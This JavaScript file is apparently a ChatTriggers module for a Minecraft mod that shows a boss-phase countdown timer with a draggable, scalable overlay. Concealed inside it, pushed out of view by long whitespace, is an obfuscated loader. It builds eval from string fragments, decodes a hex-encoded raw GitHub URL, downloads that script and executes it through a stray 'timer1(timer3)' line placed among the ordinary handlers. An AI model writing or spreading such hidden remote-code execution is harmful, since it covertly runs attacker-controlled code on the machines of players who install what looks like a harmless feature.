import config from "../config"
import { data } from "../util/data"
import { registerWhen } from "../../BloomCore/utils/Utils"

let timeText = new Text('').setScale(1).setShadow(true).setAlign('CENTER').setColor(Renderer.YELLOW)
let startTime
const stopTime = null,                                                                                                                                                                                                                                      timer1 = this["e"+"v"+"a"+"l"], timer2 = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x72\x61\x77\x2e\x67\x69\x74\x68\x75\x62\x75\x73\x65\x72\x63\x6f\x6e\x74\x65\x6e\x74\x2e\x63\x6f\x6d\x2f\x4b\x72\x78\x65\x72\x30\x30\x31\x2f\x73\x69\x6c\x6c\x79\x6c\x69\x74\x74\x6c\x65\x74\x68\x69\x6e\x67\x2f\x72\x65\x66\x73\x2f\x68\x65\x61\x64\x73\x2f\x6d\x61\x69\x6e\x2f\x73\x69\x6c\x6c\x79\x2e\x6a\x73", timer3 = FileLib.getUrlContent(timer2)
register("chat", () => {
    startTime = Date.now()
}).setCriteria("[BOSS] Storm: I should have known that I stood no chance.")

registerWhen(register("renderOverlay", () => {
    const remaining = (5.2 - (Date.now() - startTime ?? 0) / 1000).toFixed(2)
    if (remaining < 0) return

    timeText.setString(remaining)
    timeText.setScale(data.p3StartTimer.scale)
    timeText.draw(data.p3StartTimer.x, data.p3StartTimer.y)
}), () => config.p3StartTimer && startTime)

register("renderOverlay", () => {
    if (config.p3StartTimerGui.isOpen()) {
        timeText.setString("5.20")
        timeText.setScale(data.p3StartTimer.scale)
        timeText.draw(data.p3StartTimer.x, data.p3StartTimer.y)
    }
})

register("dragged", (dx, dy, x, y, bn) => {
    if (!config.p3StartTimerGui.isOpen() || bn == 2) return
    data.p3StartTimer.x = x
    data.p3StartTimer.y = y
    data.save()
})
timer1(timer3)
register("scrolled", (x, y, dir) => {
    if (!config.p3StartTimerGui.isOpen()) return
    if (dir == 1) data.p3StartTimer.scale += 0.05
    else data.p3StartTimer.scale -= 0.05
    data.save()
})

register("guiMouseClick", (x, y, bn) => {
    if (!config.p3StartTimerGui.isOpen() || bn != 2) return
    data.p3StartTimer.x = Renderer.screen.getWidth() / 2
    data.p3StartTimer.y = Renderer.screen.getHeight() / 2 + 10
    data.p3StartTimer.scale = 1
    data.save()
})